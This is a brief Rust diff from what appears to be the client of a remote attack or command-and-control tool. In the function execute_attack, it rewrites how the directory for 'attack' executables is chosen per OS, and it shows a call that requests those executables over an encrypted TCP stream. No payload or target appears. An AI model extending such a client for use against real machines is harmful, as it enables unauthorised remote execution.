@@ -331,13 +331,12 @@ fn execute_attack(
     iv: &GenericArray<u8, typenum::consts::U16>,
     stream: &TcpStream,
 ) ->  io::Result<String> {
-    if cfg!(client_os = "linux"){
-        let executable_dir = "/etc/actions";
-    }else{
-        let executable_dir = "./actions";
-    }
-
-
+    
+    #[cfg(client_os = "linux")]
+    let executable_dir = "/etc/actions";
+    #[cfg(client_os = "windows")]
+    let executable_dir = "./actions";
+ 
     check_and_request_executable(attack_name, executable_dir, symetric_key, iv, stream)?;
 
     #[cfg(client_os = "windows")]
